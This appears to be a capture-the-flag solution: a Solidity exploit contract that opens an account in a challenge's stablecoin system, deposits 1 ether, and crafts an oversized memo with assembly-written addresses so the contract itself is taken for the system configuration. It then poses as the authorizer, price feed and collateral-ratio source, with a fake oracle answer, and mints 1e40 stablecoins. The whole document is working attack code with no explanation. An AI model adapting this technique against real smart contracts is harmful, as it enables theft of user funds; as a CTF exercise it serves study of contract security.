pragma solidity ^0.8.0;

import "../src/Challenge.sol";
import "../src/SystemConfiguration.sol";
import {Account as Acct} from "../src/Account.sol";
import "../src/AccountManager.sol";

contract Exp {
  function run(address challenge) public payable {
    SystemConfiguration sc = Challenge(challenge).SYSTEM_CONFIGURATION();
    AccountManager manager = AccountManager(sc.getAccountManager());
    

    address[] memory addrs = new address[](2046);
    Acct account = Acct(manager.openAccount(address(this), addrs));
    account.deposit{value: 1 ether}();

    // string memory memo
    // 63871
    string memory memo = new string(45827 + 96 + 32);
    
    address addr = address(this);
    assembly {
      mstore(add(add(memo, 0x20), 22), shl(0x60, addr))
    }
    assembly {
      mstore(add(add(add(memo, 0x20), 22), 20), shl(0x60, addr))
    }


    manager.mintStablecoins(account, 1e40, memo);
  }

  function isAuthorized(address addr) public view returns (bool) {
    return true;
  }

  function getEthUsdPriceFeed() public view returns(address) {
    return address(this);
  }


  function latestRoundData()
    external
    view
    returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound) {

    return (0, 1, 0, 0, 0);
  }

  function getCollateralRatio() public view returns (uint256) {
    return 0;
  }
}
